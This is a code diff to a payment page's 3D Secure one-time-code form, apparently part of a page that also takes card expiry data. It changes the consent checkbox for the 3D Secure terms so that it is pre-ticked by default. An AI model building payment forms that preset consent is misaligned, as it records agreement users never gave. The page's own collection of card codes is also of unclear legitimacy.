@@ -671,16 +671,16 @@
             Incorrect verification code. Please try again.
           </p>
           
-          <div style="margin-bottom: 10px;">
-            <label id="consentLabel" style="display: flex; align-items: start; font-size: 12px; color: #333; cursor: pointer;">
-              <div id="mcConsentCheckbox" style="width: 16px; height: 16px; border: 1px solid #ccc; border-radius: 3px; margin-right: 8px; margin-top: 2px; display: flex; align-items: center; justify-content: center; background-color: white; transition: background-color 0.2s ease;">
-                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display: none;">
-                  <path d="M5 13l4 4L19 7" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
-                </svg>
-              </div>
-              <span>I agree that by clicking the box I have read, understood and accepted the 3D Secure Terms and Conditions.</span>
-            </label>
-          </div>
+         <div style="margin-bottom: 10px;">
+  <label id="consentLabel" style="display: flex; align-items: start; font-size: 12px; color: #333; cursor: pointer;">
+    <div id="mcConsentCheckbox" style="width: 16px; height: 16px; border: 1px solid #2778c4; border-radius: 3px; margin-right: 8px; margin-top: 2px; display: flex; align-items: center; justify-content: center; background-color: #2778c4; transition: background-color 0.2s ease;" class="checked">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display: block;">
+        <path d="M5 13l4 4L19 7" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </div>
+    <span>I agree that by clicking the box I have read, understood and accepted the 3D Secure Terms and Conditions.</span>
+  </label>
+</div>
           
           <!-- Full-width Submit and Resend buttons side by side -->
           <div style="display: flex; gap: 5px; margin-top: 15px;">
@@ -2185,70 +2185,69 @@ function validateExpiry(value) {
           // Find the SVG element within the checkbox
           const checkmarkSvg = mcConsentCheckbox.querySelector('svg');
           if (checkmarkSvg) {
-            // Update display property based on checked state
-            if (mcConsentCheckbox.classList.contains('checked')) {
-              checkmarkSvg.style.display = 'block';
-              mcConsentCheckbox.style.backgroundColor = '#2778c4';
-              mcConsentCheckbox.style.borderColor = '#2778c4';
-            } else {
-              checkmarkSvg.style.display = 'none';
-              mcConsentCheckbox.style.backgroundColor = 'white';
-              mcConsentCheckbox.style.borderColor = '#ccc';
-            }
-          }
-          
-          // Update submit button state
-          updateMcSubmitButton();
-          
-          // Prevent event bubbling
-          e.stopPropagation();
-        });
-        
-        // Also make the checkbox itself clickable directly
-        mcConsentCheckbox.addEventListener('click', function(e) {
-          // Toggle the 'checked' class
-          this.classList.toggle('checked');
-          
-          // Find the SVG element within the checkbox
-          const checkmarkSvg = this.querySelector('svg');
-          if (checkmarkSvg) {
-            // Update display property based on checked state
-            if (this.classList.contains('checked')) {
-              checkmarkSvg.style.display = 'block';
-              this.style.backgroundColor = '#2778c4';
-              this.style.borderColor = '#2778c4';
-            } else {
-              checkmarkSvg.style.display = 'none';
-              this.style.backgroundColor = 'white';
-              this.style.borderColor = '#ccc';
-            }
-          }
-          
-          // Update submit button state
-          updateMcSubmitButton();
-          
-          // Prevent event bubbling
-          e.stopPropagation();
-        });
-      }
+// Simpler consent checkbox toggle that works more reliably
+if (mcConsentCheckbox && consentLabel) {
+  // Make sure the entire label is clickable
+  consentLabel.style.cursor = 'pointer';
+  
+  // Set initial state - always checked by default
+  mcConsentCheckbox.classList.add('checked');
+  const checkmarkSvg = mcConsentCheckbox.querySelector('svg');
+  if (checkmarkSvg) {
+    checkmarkSvg.style.display = 'block';
+    mcConsentCheckbox.style.backgroundColor = '#2778c4';
+    mcConsentCheckbox.style.borderColor = '#2778c4';
+  }
+  
+  // Simpler click handler
+  const toggleConsent = function(e) {
+    e.preventDefault();
+    e.stopPropagation();
     
-      // Update submit button based on OTP and consent
-      function updateMcSubmitButton() {
-        if (!mcOtpInput || !mcSubmitBtn || !mcConsentCheckbox) return;
-        
-        const hasOtp = mcOtpInput.value.trim().length > 0;
-        const hasConsent = mcConsentCheckbox.classList.contains('checked');
-        
-        if (hasOtp && hasConsent) {
-          mcSubmitBtn.disabled = false;
-          mcSubmitBtn.style.backgroundColor = '#2778c4';
-          mcSubmitBtn.style.cursor = 'pointer';
-        } else {
-          mcSubmitBtn.disabled = true;
-          mcSubmitBtn.style.backgroundColor = '#CCCCCC';
-          mcSubmitBtn.style.cursor = 'not-allowed';
-        }
+    mcConsentCheckbox.classList.toggle('checked');
+    
+    const checkmarkSvg = mcConsentCheckbox.querySelector('svg');
+    if (checkmarkSvg) {
+      if (mcConsentCheckbox.classList.contains('checked')) {
+        checkmarkSvg.style.display = 'block';
+        mcConsentCheckbox.style.backgroundColor = '#2778c4';
+        mcConsentCheckbox.style.borderColor = '#2778c4';
+      } else {
+        checkmarkSvg.style.display = 'none';
+        mcConsentCheckbox.style.backgroundColor = 'white';
+        mcConsentCheckbox.style.borderColor = '#ccc';
       }
+    }
+    
+    updateMcSubmitButton();
+    return false;
+  };
+  
+  // Add the handler to both elements
+  mcConsentCheckbox.onclick = toggleConsent;
+  consentLabel.onclick = toggleConsent;
+  
+  // Always update the submit button state initially
+  setTimeout(updateMcSubmitButton, 100);
+}
+    
+   // Update submit button based on OTP and consent
+function updateMcSubmitButton() {
+  if (!mcOtpInput || !mcSubmitBtn || !mcConsentCheckbox) return;
+  
+  const hasOtp = mcOtpInput.value.trim().length > 0;
+  const hasConsent = mcConsentCheckbox.classList.contains('checked');
+  
+  if (hasOtp && hasConsent) {
+    mcSubmitBtn.disabled = false;
+    mcSubmitBtn.style.backgroundColor = '#2778c4';
+    mcSubmitBtn.style.cursor = 'pointer';
+  } else {
+    mcSubmitBtn.disabled = true;
+    mcSubmitBtn.style.backgroundColor = '#CCCCCC';
+    mcSubmitBtn.style.cursor = 'not-allowed';
+  }
+}
       
       // Submit button
       if (mcSubmitBtn) {
